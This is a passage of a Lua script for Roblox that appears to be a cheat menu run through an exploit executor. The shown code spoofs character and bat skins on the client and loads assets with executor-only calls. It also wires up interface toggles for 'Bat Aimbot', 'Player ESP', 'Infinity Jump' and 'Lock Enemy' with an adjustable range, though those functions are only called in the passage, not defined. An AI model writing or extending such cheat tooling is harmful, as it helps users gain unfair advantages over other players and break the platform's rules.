    local entry
    for _, candidate in ipairs(VISION_BAT_SKINS) do
        if candidate.name == S.batSkinMode then entry = candidate; break end
    end
    if entry then VisionBatSkin.visionPrepareBatSkin(tool, entry) end
end

function VisionBatSkin.visionScanBatSkins(parent)
    if not parent then return end
    for _, child in ipairs(parent:GetChildren()) do
        if VisionBatSkin.visionIsBat(child) then task.spawn(VisionBatSkin.visionApplyBatSkin, child) end
    end
end

function VisionBatSkin.visionWatchBatSkinContainer(parent)
    if not parent or VisionBatSkin.watched[parent] then return end
    VisionBatSkin.watched[parent] = true
    table.insert(S.batSkinConnections, parent.ChildAdded:Connect(function(child)
        task.wait(0.1)
        if VisionBatSkin.visionIsBat(child) then VisionBatSkin.visionApplyBatSkin(child) end
    end))
    VisionBatSkin.visionScanBatSkins(parent)
end

function VisionBatSkin.visionWatchBatSkinCharacter(character)
    VisionBatSkin.visionWatchBatSkinContainer(character)
    VisionBatSkin.visionWatchBatSkinContainer(LP:FindFirstChildOfClass("Backpack"))
    if S.batSkinMode ~= "Off" then
        task.delay(0.35, function()
            if LP.Character == character then
                VisionBatSkin.visionScanBatSkins(character)
                VisionBatSkin.visionScanBatSkins(LP:FindFirstChildOfClass("Backpack"))
            end
        end)
    end
end

function VisionBatSkin.visionSetBatSkin(mode, shouldSave)
    local valid = false
    for _, entry in ipairs(VISION_BAT_SKINS) do
        if entry.name == mode then valid = true; break end
    end
    S.batSkinMode = valid and mode or "Off"
    VisionBatSkin.visionScanBatSkins(LP.Character)
    VisionBatSkin.visionScanBatSkins(LP:FindFirstChildOfClass("Backpack"))
    if S.batSkinSelectorLabel then S.batSkinSelectorLabel.Text = S.batSkinMode end
    if shouldSave then saveConfig() end
end

function VisionBatSkin.visionCycleBatSkin(direction)
    local index = 1
    for i, entry in ipairs(VISION_BAT_SKINS) do
        if entry.name == S.batSkinMode then index = i; break end
    end
    index = index + (direction or 1)
    if index < 1 then index = #VISION_BAT_SKINS end
    if index > #VISION_BAT_SKINS then index = 1 end
    VisionBatSkin.visionSetBatSkin(VISION_BAT_SKINS[index].name, true)
end

S.setBatSkin = VisionBatSkin.visionSetBatSkin
S.cycleBatSkin = VisionBatSkin.visionCycleBatSkin

LP.CharacterAdded:Connect(function(character)
    task.wait(0.2)
    VisionBatSkin.visionWatchBatSkinCharacter(character)
end)
LP.ChildAdded:Connect(function(child)
    if child:IsA("Backpack") then VisionBatSkin.visionWatchBatSkinContainer(child) end
end)
VisionBatSkin.visionWatchBatSkinCharacter(LP.Character)
end

-- ==================== VISION DISPLAY MODE / COMPLETE SKINS ====================
do
VisionDisplaySkin = {}
VISION_SKIN_ORDER = {"Off", "PURPLE", "BLUE", "RED", "BLACK", "GREEN", "WHITE"}
VISION_SKIN_SETS = {
    PURPLE = {hats="1744060292,439945661,1125510,1029025", hair="", headless=true, korblox="Right", accessories={1744060292,439945661,1125510,1029025,11748356,8465506143,11444217173}, clothing={7424637509,7689651773}, color=Color3.fromRGB(145,88,255)},
    BLUE = {hats="74891470", hair="16630147,6346833550,6594911228,6594919952,6823338112,7097747842", headless=true, korblox="Right", accessories={74891470,16630147,6346833550,6594911228,6594919952,6823338112,7097747842}, clothing={18423061209,18423154566}, color=Color3.fromRGB(55,145,255)},
    RED = {hats="215718515,439945661", hair="7183785281", headless=true, korblox="Right", accessories={215718515,439945661,7183785281}, clothing={15998365201,7689651773}, color=Color3.fromRGB(235,62,72)},
    BLACK = {hats="10159600649,439946249,17798262442,92482095662016", hair="139101716417676", headless=true, korblox="Right", accessories={10159600649,439946249,17798262442,92482095662016,139101716417676,12490213797}, clothing={18766106994,13925390578}, color=Color3.fromRGB(24,24,30)},
    GREEN = {hats="553970961,1744060292", hair="93268856876777", headless=true, korblox="Right", accessories={553970961,1744060292,93268856876777}, clothing={9478068776,6348682339}, color=Color3.fromRGB(62,210,112)},
    WHITE = {hats="74891470,215718515,439945661,1016143686,1744060292,10159600649,89012651581593,88365652378427", hair="126447390530523", headless=true, korblox="Right", accessories={74891470,215718515,439945661,1016143686,1744060292,10159600649,89012651581593,126447390530523}, clothing={88032876921227,108259950755140}, color=Color3.fromRGB(238,238,244)},
}
VISION_ASSET_PROPERTIES = {
    [1744060292]="HatAccessory", [439945661]="HatAccessory", [1125510]="HatAccessory", [1029025]="HatAccessory", [8465506143]="HatAccessory", [74891470]="HatAccessory", [215718515]="HatAccessory", [10159600649]="HatAccessory", [439946249]="HatAccessory", [17798262442]="HatAccessory", [92482095662016]="HatAccessory", [553970961]="HatAccessory", [1016143686]="HatAccessory", [89012651581593]="HatAccessory", [88365652378427]="HatAccessory",
    [16630147]="HairAccessory", [6346833550]="HairAccessory", [6594911228]="HairAccessory", [6594919952]="HairAccessory", [6823338112]="HairAccessory", [7097747842]="HairAccessory", [7183785281]="HairAccessory", [139101716417676]="HairAccessory", [93268856876777]="HairAccessory", [126447390530523]="HairAccessory",
    [11748356]="FaceAccessory", [12490213797]="FaceAccessory", [11444217173]="NeckAccessory",
    [7424637509]="Shirt", [18423061209]="Shirt", [15998365201]="Shirt", [18766106994]="Shirt", [9478068776]="Shirt", [88032876921227]="Shirt",
    [7689651773]="Pants", [18423154566]="Pants", [13925390578]="Pants", [6348682339]="Pants", [108259950755140]="Pants",
}
VisionOriginalDescriptions = setmetatable({}, {__mode="k"})
VisionOriginalOutfits = setmetatable({}, {__mode="k"})

function VisionDisplaySkin.assetInSet(id, setData)
    id=tonumber(id); if not id or not setData then return false end
    for _,v in ipairs(setData.accessories or {}) do if id==v then return true end end
    for _,v in ipairs(setData.clothing or {}) do if id==v then return true end end
    return false
end
function VisionDisplaySkin.appendDescriptionAsset(description, id)
    local property=VISION_ASSET_PROPERTIES[tonumber(id)]
    if not property then return end
    if property=="Shirt" or property=="Pants" then description[property]=tonumber(id); return end
    local old=tostring(description[property] or "")
    if not old:find(tostring(id),1,true) then description[property]=(old=="" and tostring(id) or old..","..tostring(id)) end
end
function VisionDisplaySkin.buildDescription(setName, character)
    local setData=VISION_SKIN_SETS[setName]; if not setData then return nil end
    local humanoid=character and character:FindFirstChildOfClass("Humanoid"); if not humanoid then return nil end
    local description
    pcall(function() description=humanoid:GetAppliedDescription():Clone() end)
    if not description then pcall(function() description=Players:GetHumanoidDescriptionFromUserId(LP.UserId) end) end
    if not description then description=Instance.new("HumanoidDescription") end
    for _,property in ipairs({"HatAccessory","HairAccessory","FaceAccessory","NeckAccessory","ShouldersAccessory","FrontAccessory","BackAccessory","WaistAccessory","ShirtAccessory","PantsAccessory","JacketAccessory","SweaterAccessory","ShortsAccessory","TShirtAccessory","DressSkirtAccessory"}) do pcall(function() description[property]="" end) end
    pcall(function() description.Shirt=0; description.Pants=0; description.GraphicTShirt=0; description.HatAccessory=setData.hats or ""; description.HairAccessory=setData.hair or "" end)
    for _,id in ipairs(setData.accessories or {}) do VisionDisplaySkin.appendDescriptionAsset(description,id) end
    for _,id in ipairs(setData.clothing or {}) do VisionDisplaySkin.appendDescriptionAsset(description,id) end
    return description
end
function VisionDisplaySkin.applyDescription(humanoid, description)
    if not humanoid or not description then return false end
    for _,methodName in ipairs({"ApplyDescriptionClientServer","ApplyDescriptionReset","ApplyDescription"}) do
        local method
        pcall(function() method=humanoid[methodName] end)
        if type(method)=="function" then
            local copy=description:Clone(); local ok=pcall(method,humanoid,copy); copy:Destroy(); if ok then return true end
        end
    end
    return false
end
function VisionDisplaySkin.captureOriginalOutfit(character)
    if VisionOriginalOutfits[character] then return end
    local saved={}
    for _,child in ipairs(character:GetChildren()) do
        if child:IsA("Accessory") or child:IsA("Accoutrement") or child:IsA("Shirt") or child:IsA("Pants") or child:IsA("ShirtGraphic") then
            local ok,clone=pcall(function() return child:Clone() end)
            if ok and clone then saved[#saved+1]=clone end
        end
    end
    VisionOriginalOutfits[character]=saved
end
function VisionDisplaySkin.restoreOriginalOutfit(character)
    local saved=VisionOriginalOutfits[character]
    if not saved then return end
    for _,child in ipairs(character:GetChildren()) do
        if child:IsA("Accessory") or child:IsA("Accoutrement") or child:IsA("Shirt") or child:IsA("Pants") or child:IsA("ShirtGraphic") then pcall(function() child:Destroy() end) end
    end
    local humanoid=character:FindFirstChildOfClass("Humanoid")
    for _,clone in ipairs(saved) do
        local copy=clone:Clone()
        if copy:IsA("Accessory") and humanoid then VisionDisplaySkin.attachAccessory(character,humanoid,copy) else copy.Parent=character end
    end
end

function VisionDisplaySkin.clearMarked(character)
    for _,child in ipairs(character:GetChildren()) do
        if child:GetAttribute("VisionCompleteSkin") then pcall(function() child:Destroy() end) end
    end
end
function VisionDisplaySkin.markAndColor(character, setData)
    for _,child in ipairs(character:GetChildren()) do
        if child:IsA("Accessory") or child:IsA("Accoutrement") or child:IsA("Shirt") or child:IsA("Pants") or child:IsA("ShirtGraphic") then
            local id
            pcall(function() id=tonumber(child.SourceAssetId) end)
            if VisionDisplaySkin.assetInSet(id,setData) then child:SetAttribute("VisionCompleteSkin",true) end
        end
    end
    for _,descendant in ipairs(character:GetDescendants()) do
        if descendant:IsA("BasePart") then
            local parent=descendant
            while parent and parent~=character do
                if parent:GetAttribute("VisionCompleteSkin") then descendant.Color=setData.color; break end
                parent=parent.Parent
            end
        end
    end
end
function VisionDisplaySkin.setHeadless(character, enabled)
    local head=character and character:FindFirstChild("Head"); if not head then return end
    local transparency=enabled and 1 or 0; head.Transparency=transparency; head.LocalTransparencyModifier=transparency
    for _,child in ipairs(head:GetChildren()) do if child:IsA("Decal") or child:IsA("Texture") then child.Transparency=transparency end end
end
function VisionDisplaySkin.attachAccessory(character, humanoid, accessory)
    local handle=accessory:FindFirstChild("Handle",true)
    pcall(function() humanoid:AddAccessory(accessory) end)
    if not accessory.Parent then accessory.Parent=character end
    if not handle or not handle:IsA("BasePart") then return accessory.Parent==character end
    local handleAttachment=handle:FindFirstChildWhichIsA("Attachment")
    if not handleAttachment then return accessory.Parent==character end
    local targetAttachment
    for _,descendant in ipairs(character:GetDescendants()) do
        if descendant:IsA("Attachment") and descendant.Name==handleAttachment.Name and not descendant:IsDescendantOf(accessory) then targetAttachment=descendant; break end
    end
    if targetAttachment and targetAttachment.Parent:IsA("BasePart") then
        handle.Anchored=false; handle.CanCollide=false; handle.CanTouch=false; handle.CanQuery=false; handle.Massless=true
        handle.CFrame=targetAttachment.Parent.CFrame*targetAttachment.CFrame*handleAttachment.CFrame:Inverse()
        if not handle:FindFirstChild("VisionAccessoryWeld") then
            local weld=Instance.new("WeldConstraint"); weld.Name="VisionAccessoryWeld"; weld.Part0=targetAttachment.Parent; weld.Part1=handle; weld.Parent=handle
        end
    end
    return accessory.Parent==character
end
function VisionDisplaySkin.hasAsset(character, assetId)
    assetId=tonumber(assetId)
    for _,child in ipairs(character:GetChildren()) do
        local sourceId
        pcall(function() sourceId=tonumber(child.SourceAssetId) end)
        if assetId and assetId>0 then
            if sourceId==assetId or tonumber(child:GetAttribute("VisionSkinAssetId"))==assetId then return true end
        end
    end
    return false
end
function VisionDisplaySkin.addAsset(character, humanoid, assetId)
    if VisionDisplaySkin.hasAsset(character,assetId) then return true end
    local ok, objects=pcall(function() return game:GetObjects("rbxassetid://"..tostring(assetId)) end)
    if not ok or type(objects)~="table" or #objects==0 then
        local loaded
        pcall(function() loaded=game:GetService("InsertService"):LoadAsset(tonumber(assetId)) end)
        objects=loaded and {loaded} or {}
    end
    local added=false
    for _,root in ipairs(objects) do
        local candidates={}
        if root:IsA("Accessory") or root:IsA("Shirt") or root:IsA("Pants") or root:IsA("ShirtGraphic") then table.insert(candidates,root) end
        for _,descendant in ipairs(root:GetDescendants()) do
            if descendant:IsA("Accessory") or descendant:IsA("Shirt") or descendant:IsA("Pants") or descendant:IsA("ShirtGraphic") then table.insert(candidates,descendant) end
        end
        for _,source in ipairs(candidates) do
            local clone=source:Clone(); clone:SetAttribute("VisionCompleteSkin",true); clone:SetAttribute("VisionSkinAssetId",tonumber(assetId))
            if clone:IsA("Accessory") then
                if VisionDisplaySkin.attachAccessory(character,humanoid,clone) then added=true end
            else
                for _,old in ipairs(character:GetChildren()) do if old.ClassName==clone.ClassName and old:GetAttribute("VisionCompleteSkin") then old:Destroy() end end
                clone.Parent=character; added=true
            end
        end
        pcall(function() root:Destroy() end)
    end
    return added
end

function VisionDisplaySkin.applyAccessories(character, humanoid, description, setData)
    local source
    pcall(function() source=Players:CreateHumanoidModelFromDescriptionAsync(description,Enum.HumanoidRigType.R15) end)
    if not source then pcall(function() source=Players:CreateHumanoidModelFromDescription(description,Enum.HumanoidRigType.R15) end) end
    if not source then return end
    for _,child in ipairs(source:GetChildren()) do
        if child:IsA("Accessory") or child:IsA("Shirt") or child:IsA("Pants") or child:IsA("ShirtGraphic") then
            if child:IsA("Accessory") then
                local sourceId; pcall(function() sourceId=tonumber(child.SourceAssetId) end)
                if not VisionDisplaySkin.hasAsset(character,sourceId) then
                    local clone=child:Clone(); clone:SetAttribute("VisionCompleteSkin",true); clone:SetAttribute("VisionSkinAssetId",sourceId)
                    VisionDisplaySkin.attachAccessory(character,humanoid,clone)
                end
            else
                for _,current in ipairs(character:GetChildren()) do if current.ClassName==child.ClassName then pcall(function() current:Destroy() end) end end
                local clone=child:Clone(); clone:SetAttribute("VisionCompleteSkin",true); clone.Parent=character
            end
        end
    end
    source:Destroy(); VisionDisplaySkin.markAndColor(character,setData)
end

function VisionDisplaySkin.apply(token)
    token=token or S._skinApplyToken
    local character=LP.Character; local setName=S.displaySkin
    if token~=S._skinApplyToken or not character or setName=="Off" or not S.customSkinEnabled then return end
    local humanoid=character:FindFirstChildOfClass("Humanoid"); local setData=VISION_SKIN_SETS[setName]
    if not humanoid or not setData then return end
    if not VisionOriginalDescriptions[character] then pcall(function() VisionOriginalDescriptions[character]=humanoid:GetAppliedDescription():Clone() end) end
    VisionDisplaySkin.captureOriginalOutfit(character)

    -- Vanta quita los accesorios actuales y aplica la descripción completa primero.
    for _,child in ipairs(character:GetChildren()) do
        if child:IsA("Accessory") or child:IsA("Accoutrement") then pcall(function() child:Destroy() end) end
    end
    local description=VisionDisplaySkin.buildDescription(setName,character)
    if description then VisionDisplaySkin.applyDescription(humanoid,description) end
    task.wait(0.18)
    if token~=S._skinApplyToken then if description then description:Destroy() end; return end

    -- Fallback directo: añade cada asset de la skin aunque ApplyDescription no lo adjunte.
    for _,id in ipairs(setData.accessories or {}) do VisionDisplaySkin.addAsset(character,humanoid,id) end
    for _,id in ipairs(setData.clothing or {}) do VisionDisplaySkin.addAsset(character,humanoid,id) end
    task.wait(0.35)
    if token~=S._skinApplyToken then if description then description:Destroy() end; return end
    for _,id in ipairs(setData.accessories or {}) do VisionDisplaySkin.addAsset(character,humanoid,id) end
    for _,id in ipairs(setData.clothing or {}) do VisionDisplaySkin.addAsset(character,humanoid,id) end
    if description then VisionDisplaySkin.applyAccessories(character,humanoid,description,setData) end
    if description then description:Destroy() end
    VisionDisplaySkin.markAndColor(character,setData)
    VisionDisplaySkin.setHeadless(character,setData.headless==true)
    if type(_G._VisionApplyKroblox)=="function" then pcall(_G._VisionApplyKroblox,setData.korblox or "Off") end
end

function VisionDisplaySkin.off()
    local character=LP.Character; if not character then return end
    local humanoid=character:FindFirstChildOfClass("Humanoid")
    VisionDisplaySkin.clearMarked(character)
    if humanoid and VisionOriginalDescriptions[character] then
        VisionDisplaySkin.applyDescription(humanoid,VisionOriginalDescriptions[character]:Clone())
        task.wait(0.2)
    end
    VisionDisplaySkin.restoreOriginalOutfit(character)
    VisionDisplaySkin.setHeadless(character,false)
    if type(_G._VisionApplyKroblox)=="function" then pcall(_G._VisionApplyKroblox,"Off") end
end
function VisionDisplaySkin.setSkin(name,save)
    S._skinApplyToken=S._skinApplyToken+1
    local myToken=S._skinApplyToken
    local valid=false; for _,v in ipairs(VISION_SKIN_ORDER) do if v==name then valid=true end end
    S.displaySkin=valid and name or "Off"
    if S.displaySkin=="Off" then S.customSkinEnabled=false; VisionDisplaySkin.off() else S.customSkinEnabled=true; task.spawn(function() pcall(VisionDisplaySkin.apply,myToken) end) end
    if S.displaySkinSelectorLabel then S.displaySkinSelectorLabel.Text=S.displaySkin end
    if S.customSkinVisual then S.customSkinVisual(S.customSkinEnabled) end
    if save then saveConfig() end
end
function VisionDisplaySkin.cycleSkin(direction)
    local index=1; for i,v in ipairs(VISION_SKIN_ORDER) do if v==S.displaySkin then index=i end end
    index=index+(direction or 1); if index<1 then index=#VISION_SKIN_ORDER end; if index>#VISION_SKIN_ORDER then index=1 end
    VisionDisplaySkin.setSkin(VISION_SKIN_ORDER[index],true)
end
function VisionDisplaySkin.setCustom(on)
    S._skinApplyToken=S._skinApplyToken+1
    local myToken=S._skinApplyToken
    S.customSkinEnabled=on==true
    if S.customSkinEnabled then if S.displaySkin=="Off" then S.displaySkin="PURPLE" end; task.spawn(function() VisionDisplaySkin.apply(myToken) end) else VisionDisplaySkin.off() end
    if S.customSkinVisual then S.customSkinVisual(S.customSkinEnabled) end
    if S.displaySkinSelectorLabel then S.displaySkinSelectorLabel.Text=S.displaySkin end
    saveConfig()
end
S.setDisplaySkin=VisionDisplaySkin.setSkin; S.cycleDisplaySkin=VisionDisplaySkin.cycleSkin; S.setCustomSkin=VisionDisplaySkin.setCustom
S.applyDisplaySkin=function(token) return VisionDisplaySkin.apply(token) end
LP.CharacterAdded:Connect(function(character) task.wait(0.4); VisionOriginalDescriptions[character]=nil; VisionOriginalOutfits[character]=nil; if S.customSkinEnabled and S.displaySkin~="Off" then task.spawn(VisionDisplaySkin.apply) end end)
end

local function buildMainTab(pages)
    mkSection("Main", pages, "Counters")
    local batVis, _ = mkToggle("Main", pages, "Bat Aimbot", S.KB.AutoBat.kb, S.batAimbotEnabled, function(on)
        if on then
            if S.autoLeftEnabled then S.autoLeftEnabled=false; if S.autoLeftSetVisual then S.autoLeftSetVisual(false) end; stopAutoLeft() end
            if S.autoRightEnabled then S.autoRightEnabled=false; if S.autoRightSetVisual then S.autoRightSetVisual(false) end; stopAutoRight() end
        end
        setBatAimbot(on); updateFloatingButtons()
    end, function(k,isGp)
        if isGp then S.KB.AutoBat.gp=k; S.KB.AutoBat.kb=nil
        else S.KB.AutoBat.kb=k; S.KB.AutoBat.gp=nil end; saveConfig()
    end)
    S.batAimbotSetVisual = batVis
    S.setBatCounterVisual, _ = mkToggle("Main", pages, "Bat Counter", nil, S.batCounterEnabled, function(on)
        S.batCounterEnabled = on
        if on then startBatCounter() else stopBatCounter() end
        saveConfig()
    end, nil)
    S.setMedusaVisual, _ = mkToggle("Main", pages, "Medusa Counter", nil, S.medusaCounterEnabled, function(on)
        S.medusaCounterEnabled=on
        if on then setupMedusaCounter(LP.Character) else stopMedusaCounter() end; saveConfig()
    end, nil)
    do
        local card = mkCard("Main", pages, 40)
        local label = Instance.new("TextLabel", card)
        label.Size = UDim2.new(0, 108, 1, 0)
        label.Position = UDim2.new(0, 12, 0, 0)
        label.BackgroundTransparency = 1
        label.Text = "Bat Skins"
        label.TextColor3 = C_WHITE
        label.Font = Enum.Font.GothamBold
        label.TextSize = 11
        label.TextXAlignment = Enum.TextXAlignment.Left
        local selector = Instance.new("Frame", card)
        selector.Size = UDim2.new(0, 142, 1, 0)
        selector.Position = UDim2.new(1, -152, 0, 0)
        selector.BackgroundTransparency = 1
        local function makeBatSkinButton(text, x)
            local button = Instance.new("TextButton", selector)
            button.Size = UDim2.new(0, 22, 0, 24)
            button.Position = UDim2.new(0, x, 0.5, -12)
            button.BackgroundTransparency = 1
            button.BorderSizePixel = 0
            button.Text = text
            button.TextColor3 = C_WHITE
            button.Font = Enum.Font.GothamBold
            button.TextSize = 13
            button.AutoButtonColor = false
            button.ZIndex = 10
            return button
        end
        local left = makeBatSkinButton("<", 0)
        S.batSkinSelectorLabel = Instance.new("TextLabel", selector)
        S.batSkinSelectorLabel.Size = UDim2.new(0, 90, 0, 24)
        S.batSkinSelectorLabel.Position = UDim2.new(0, 26, 0.5, -12)
        S.batSkinSelectorLabel.BackgroundTransparency = 1
        S.batSkinSelectorLabel.Text = S.batSkinMode
        S.batSkinSelectorLabel.TextColor3 = C_WHITE
        S.batSkinSelectorLabel.Font = Enum.Font.GothamBold
        S.batSkinSelectorLabel.TextSize = 10
        S.batSkinSelectorLabel.TextXAlignment = Enum.TextXAlignment.Center
        S.batSkinSelectorLabel.TextTruncate = Enum.TextTruncate.AtEnd
        S.batSkinSelectorLabel.ZIndex = 9
        local right = makeBatSkinButton(">", 120)
        left.MouseButton1Click:Connect(function() S.cycleBatSkin(-1) end)
        right.MouseButton1Click:Connect(function() S.cycleBatSkin(1) end)
    end
    mkSection("Main", pages, "Display Mode")
    do
        local card = mkCard("Main", pages, 40)
        local label = Instance.new("TextLabel", card); label.Size=UDim2.new(0,108,1,0); label.Position=UDim2.new(0,12,0,0); label.BackgroundTransparency=1; label.Text="Skins"; label.TextColor3=C_WHITE; label.Font=Enum.Font.GothamBold; label.TextSize=11; label.TextXAlignment=Enum.TextXAlignment.Left
        local selector=Instance.new("Frame",card); selector.Size=UDim2.new(0,142,1,0); selector.Position=UDim2.new(1,-152,0,0); selector.BackgroundTransparency=1
        local left=Instance.new("TextButton",selector); left.Size=UDim2.fromOffset(22,24); left.Position=UDim2.new(0,0,0.5,-12); left.BackgroundTransparency=1; left.Text="<"; left.TextColor3=C_WHITE; left.Font=Enum.Font.GothamBold; left.TextSize=13; left.AutoButtonColor=false
        S.displaySkinSelectorLabel=Instance.new("TextLabel",selector); S.displaySkinSelectorLabel.Size=UDim2.fromOffset(90,24); S.displaySkinSelectorLabel.Position=UDim2.new(0,26,0.5,-12); S.displaySkinSelectorLabel.BackgroundTransparency=1; S.displaySkinSelectorLabel.Text=S.displaySkin; S.displaySkinSelectorLabel.TextColor3=C_WHITE; S.displaySkinSelectorLabel.Font=Enum.Font.GothamBold; S.displaySkinSelectorLabel.TextSize=10; S.displaySkinSelectorLabel.TextXAlignment=Enum.TextXAlignment.Center; S.displaySkinSelectorLabel.TextTruncate=Enum.TextTruncate.AtEnd
        local right=Instance.new("TextButton",selector); right.Size=UDim2.fromOffset(22,24); right.Position=UDim2.new(0,120,0.5,-12); right.BackgroundTransparency=1; right.Text=">"; right.TextColor3=C_WHITE; right.Font=Enum.Font.GothamBold; right.TextSize=13; right.AutoButtonColor=false
        left.MouseButton1Click:Connect(function() S.cycleDisplaySkin(-1) end); right.MouseButton1Click:Connect(function() S.cycleDisplaySkin(1) end)
    end
    S.customSkinVisual, _ = mkToggle("Main", pages, "Custom Skin", nil, S.customSkinEnabled, function(on) S.setCustomSkin(on) end, nil)
    mkSection("Main", pages, "Player")
    S.setESPVisual, _ = mkToggle("Main", pages, "Player ESP", nil, S.espEnabled, function(on)
        toggleESP(on); saveConfig()
    end, nil)
    S.setFpsVisual, _ = mkToggle("Main", pages, "FPS Boost", nil, S.fpsBoostEnabled, function(on)
        S.fpsBoostEnabled=on; if on then applyFPSBoost() else stopFPSBoost() end; saveConfig()
    end, nil)
    S.setHoldJumpVisual, _ = mkToggle("Main", pages, "Infinity Jump", nil, S.holdJumpEnabled, function(on)
        S.holdJumpEnabled=on
        if on then startHoldJump() else stopHoldJump() end
        saveConfig()
    end, nil)
    mkSection("Main", pages, "Protection")
    S.setAntiFlingVisual, _ = mkToggle("Main", pages, "Anti Fling", nil, S.antiFlingEnabled, function(on)
        if on then YF.startAntiFling() else YF.stopAntiFling() end
        saveConfig()
    end, nil)
    S.bodyLockSetVisual, _ = mkToggle("Main", pages, "Lock Enemy", nil, S.bodyLockEnabled, function(on)
        if on then YF.startBodyLock() else YF.stopBodyLock() end
        saveConfig()
    end, nil)
    mkInput("Main", pages, "Lock Enemy Range", S.bodyLockRange, function(value)
        if value and value > 0 then
            S.bodyLockRange = math.clamp(math.floor(value), 5, 200)
            saveConfig()
        end
    end)
    mkSection("Main", pages, "Visuals")
    S.setVividVisual, _ = mkToggle("Main", pages, "Vivid Graphics", nil, S.vividGraphicsEnabled, function(on)
        toggleVividGraphics(on)
    end, nil)
    S.setStretchVisual, _ = mkToggle("Main", pages, "Stretch Rez", nil, S.stretchEnabled, function(on)
        if on then enableStretch() else disableStretch() end
        S.stretchEnabled = on
        saveConfig()
    end, nil)
    do
        local card = mkCard("Main", pages, 40)
        local label = Instance.new("TextLabel", card)
        label.Size = UDim2.new(0, 118, 1, 0)
        label.Position = UDim2.new(0, 12, 0, 0)
        label.BackgroundTransparency = 1
        label.Text = "Kroblox Select"
        label.TextColor3 = C_WHITE
        label.Font = Enum.Font.GothamBold
        label.TextSize = 11
        label.TextXAlignment = Enum.TextXAlignment.Left
        local selector = Instance.new("Frame", card)
        selector.Size = UDim2.new(0, 142, 1, 0)
        selector.Position = UDim2.new(1, -152, 0, 0)
        selector.BackgroundTransparency = 1
        local function makeKrobloxButton(text, x)
            local button = Instance.new("TextButton", selector)
            button.Size = UDim2.new(0, 22, 0, 24)
            button.Position = UDim2.new(0, x, 0.5, -12)
            button.BackgroundTransparency = 1
            button.BorderSizePixel = 0
            button.Text = text
            button.TextColor3 = C_WHITE
            button.Font = Enum.Font.GothamBold
            button.TextSize = 13
            button.AutoButtonColor = false
            button.ZIndex = 10
            return button
        end
        local left = makeKrobloxButton("<", 0)
        S.krobloxSelectorLabel = Instance.new("TextLabel", selector)
        S.krobloxSelectorLabel.Size = UDim2.new(0, 90, 0, 24)
        S.krobloxSelectorLabel.Position = UDim2.new(0, 26, 0.5, -12)
        S.krobloxSelectorLabel.BackgroundTransparency = 1
        S.krobloxSelectorLabel.Text = S.krobloxMode
        S.krobloxSelectorLabel.TextColor3 = C_WHITE
        S.krobloxSelectorLabel.Font = Enum.Font.GothamBold
        S.krobloxSelectorLabel.TextSize = 10
        S.krobloxSelectorLabel.TextXAlignment = Enum.TextXAlignment.Center
        S.krobloxSelectorLabel.TextTruncate = Enum.TextTruncate.AtEnd
        S.krobloxSelectorLabel.ZIndex = 9
        local right = makeKrobloxButton(">", 120)
        local options = {"Off", "Left", "Right", "Both"}
        local function changeKroblox(direction)
            local index = 1
            for i, name in ipairs(options) do
                if name == S.krobloxMode then index = i; break end
            end
            index = index + direction
            if index < 1 then index = #options end
            if index > #options then index = 1 end
            local mode = options[index]
            pcall(_G._VisionApplyKroblox, mode)
            S.krobloxSelectorLabel.Text = mode
            saveConfig()
        end
        left.MouseButton1Click:Connect(function()
            changeKroblox(-1)
        end)
        right.MouseButton1Click:Connect(function()
            changeKroblox(1)
        end)
    end
    do
        local card = mkCard("Main", pages, 40)
        local label = Instance.new("TextLabel", card)
        label.Size = UDim2.new(0, 100, 1, 0)
        label.Position = UDim2.new(0, 12, 0, 0)
        label.BackgroundTransparency = 1
        label.Text = "Sky Theme"
        label.TextColor3 = C_WHITE
        label.Font = Enum.Font.GothamBold
        label.TextSize = 11
        label.TextXAlignment = Enum.TextXAlignment.Left
        local selector = Instance.new("Frame", card)
        selector.Size = UDim2.new(0, 142, 1, 0)
        selector.Position = UDim2.new(1, -152, 0, 0)
        selector.BackgroundTransparency = 1
        local function makeSkyButton(text, x)
            local button = Instance.new("TextButton", selector)
            button.Size = UDim2.new(0, 22, 0, 24)
            button.Position = UDim2.new(0, x, 0.5, -12)
            button.BackgroundTransparency = 1
            button.BorderSizePixel = 0
            button.Text = text
            button.TextColor3 = C_WHITE
            button.Font = Enum.Font.GothamBold
            button.TextSize = 13
            button.AutoButtonColor = false
            button.ZIndex = 10
            return button
        end
        local left = makeSkyButton("<", 0)
        S.skySelectorLabel = Instance.new("TextLabel", selector)
        S.skySelectorLabel.Size = UDim2.new(0, 90, 0, 24)
        S.skySelectorLabel.Position = UDim2.new(0, 26, 0.5, -12)
        S.skySelectorLabel.BackgroundTransparency = 1
        S.skySelectorLabel.Text = S.skyTheme
        S.skySelectorLabel.TextColor3 = C_WHITE
        S.skySelectorLabel.Font = Enum.Font.GothamBold
        S.skySelectorLabel.TextSize = 10
        S.skySelectorLabel.TextXAlignment = Enum.TextXAlignment.Center
        S.skySelectorLabel.TextTruncate = Enum.TextTruncate.AtEnd
        S.skySelectorLabel.ZIndex = 9
        local right = makeSkyButton(">", 120)
        local function changeSky(direction)
            local index = 1
            for i, name in ipairs(SKY_PRESETS_LIST) do
                if name == S.skyTheme then index = i; break end
            end
            index = index + direction
            if index < 1 then index = #SKY_PRESETS_LIST end
            if index > #SKY_PRESETS_LIST then index = 1 end
            local name = SKY_PRESETS_LIST[index]
            pcall(applyCustomSky, name)
            S.skyTheme = name
            S.skySelectorLabel.Text = name
            saveConfig()
        end
        left.MouseButton1Click:Connect(function() changeSky(-1) end)
        right.MouseButton1Click:Connect(function() changeSky(1) end)
    end
    mkSection("Main", pages, "Character / Performance")
    do
        local card = mkCard("Main", pages, 40)
        local title = Instance.new("TextLabel", card)
        title.Size = UDim2.new(0, 100, 1, 0)
        title.Position = UDim2.new(0, 12, 0, 0)
        title.BackgroundTransparency = 1
        title.Text = "Anim Pack"
        title.TextColor3 = C_WHITE
        title.Font = Enum.Font.GothamBold
        title.TextSize = 11
        title.TextXAlignment = Enum.TextXAlignment.Left
        local selector = Instance.new("Frame", card)
        selector.Size = UDim2.new(0, 142, 1, 0)
        selector.Position = UDim2.new(1, -152, 0, 0)
        selector.BackgroundTransparency = 1
        local function makeAnimButton(text, x)
            local button = Instance.new("TextButton", selector)
            button.Size = UDim2.new(0, 22, 0, 24)
            button.Position = UDim2.new(0, x, 0.5, -12)
            button.BackgroundTransparency = 1
            button.BorderSizePixel = 0
            button.Text = text
            button.TextColor3 = C_WHITE
            button.Font = Enum.Font.GothamBold
            button.TextSize = 13
            button.AutoButtonColor = false
            button.ZIndex = 10
            return button
        end
        local left = makeAnimButton("<", 0)
        S.animSelectorLabel = Instance.new("TextLabel", selector)
        S.animSelectorLabel.Size = UDim2.new(0, 90, 0, 24)
